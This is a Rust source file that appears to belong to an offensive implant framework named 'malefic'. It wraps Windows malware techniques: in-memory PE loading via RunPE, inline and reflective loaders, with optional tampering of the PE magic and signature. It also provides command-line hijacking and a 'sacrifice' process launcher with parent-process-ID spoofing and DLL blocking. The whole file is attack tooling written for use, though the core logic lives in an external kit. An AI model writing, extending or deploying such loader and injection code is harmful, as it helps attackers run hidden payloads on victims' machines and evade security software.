pub mod runpe;
pub mod inlinepe;
pub mod utils;
pub mod reflective_loader;

pub unsafe fn unload_pe(pe_loader: *mut core::ffi::c_void) {
    #[cfg(feature = "prebuild")]
    crate::win::kit::unload_pe(pe_loader as _);
    #[cfg(feature = "source")]
    malefic_win_kit::pe::PELoader::unload_pe(pe_loader as _);
}

pub unsafe fn hijack_commandline(
    commandline: &Option<String>
) -> bool {
    #[cfg(feature = "prebuild")] {
        let s = String::new();
        let commandline = match commandline.as_ref() {
            Some(commandline) => commandline,
            None => &s,
        };
        crate::win::kit::hijack_commandline(commandline.as_ptr(), commandline.len())
    }
    #[cfg(feature = "source")] {
        malefic_win_kit::pe::utils::hijack_commandline(&commandline)
    }
}

#[cfg(feature = "prebuild")]
pub unsafe fn load_pe(
    bin: Vec<u8>,
    magic: Option<u16>,
    signature: Option<u32>,
) -> *const core::ffi::c_void {
    use crate::win::kit::PELoader;
    if bin.is_empty() {
        return std::ptr::null();
    }
    let need_modify_sign = match signature {
        Some(_) => true,
        None => false,
    };
    let need_modify_magic = match magic {
        Some(_) => true,
        None => false,
    };
    let pe_loader = PELoader(
        std::ptr::null_mut(),
        bin.as_ptr() as _,
        bin.len(),
        need_modify_magic,
        need_modify_sign,
        magic.unwrap_or(0),
        signature.unwrap_or(0),
    );
    return pe_loader;
}

#[cfg(feature = "source")]
pub unsafe fn load_pe(
    bin: Vec<u8>,
    magic: Option<u16>,
    signature: Option<u32>,
) -> *const malefic_win_kit::pe::PELoader::MaleficModule {
    
    use malefic_win_kit::pe::PELoader::malefic_loader;
    if bin.is_empty() {
        return std::ptr::null();
    }
    let pe_loader = malefic_loader(
        std::ptr::null_mut(),
        bin.as_ptr() as _,
        bin.len(),
        &magic,
        &signature,
    );
    return pe_loader;
}

pub unsafe fn run_sacrifice(
    application_name: *mut u8,
    start_commandline: &[u8],
    hijack_commandline: &[u8],
    parent_id: u32,
    need_output: bool,
    block_dll: bool,
) -> Vec<u8> {
    #[cfg(feature = "prebuild")]
    {
        let ret = crate::win::kit::RunSacrifice(
            application_name,
            start_commandline.as_ptr(),
            start_commandline.len(),
            hijack_commandline.as_ptr(),
            hijack_commandline.len(),
            parent_id,
            need_output,
            block_dll,
        );
        let str = String::from_raw_parts(ret.data, ret.len, ret.capacity);
        str.as_bytes().to_vec()
    }
    #[cfg(feature = "source")]
    {
        use malefic_win_kit::process::Sacrifice::RunSacrifice;
        match RunSacrifice(
            application_name,
            start_commandline,
            hijack_commandline,
            parent_id,
            need_output,
            block_dll,
        ) {
            Ok(ret) => {
                ret
            },
            Err(e) => {
                e.as_bytes().to_vec()
            }
        }
    }
}